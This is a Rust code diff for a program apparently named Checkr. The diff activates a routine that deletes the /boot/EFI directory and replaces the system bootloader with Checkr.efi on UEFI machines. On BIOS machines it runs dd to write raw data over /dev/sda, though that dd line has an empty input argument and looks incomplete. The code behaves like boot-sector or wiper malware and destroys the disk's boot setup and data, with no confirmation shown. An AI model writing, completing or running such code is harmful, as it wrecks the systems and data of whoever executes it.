@@ -1,20 +1,11 @@
-use std::fmt::Debug;
 use std::process;
-use colored::Colorize;
 use nix::unistd::Uid;
-use std::fs;
 use std::path;
 use std::env;
-use serde::de::Deserializer;
 
 mod log;
-
-fn copytoefi() -> Result<(), std::io::Error> {
-    fs::remove_dir_all("/boot/EFI/").expect("failed to remove dirs");
-    fs::create_dir_all("/boot/EFI/BOOT/").expect("failed to create dirs");
-    fs::copy("Checkr.efi", "/boot/EFI/BOOT/BOOTX64.EFI").expect("failed to copy file");
-    Ok(())
-}
+mod disk;
+mod util;
 
 fn main() {
     env::set_var("VERBOSE", "1");
@@ -28,10 +19,13 @@ fn main() {
     //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
     if path::Path::new("/sys/firmware/efi").exists() {
       log::info("uefi detected");
-      //  copytoefi().expect("failed to copy file");
+      let copytouefi = util::copytoefi();
+      if copytouefi.is_err() {
+          log::error("failed to copy file to EFI partition");
+      }
     }
     else{
-        log::info("bios detected");
+        if env::var("VERBOSE").is_ok() {log::info("bios detected");}
         let dd = process::Command::new("dd").arg("if=").arg("of=/dev/sda").spawn();
         if dd.is_err() {
             log::error("failed to write to disk.");
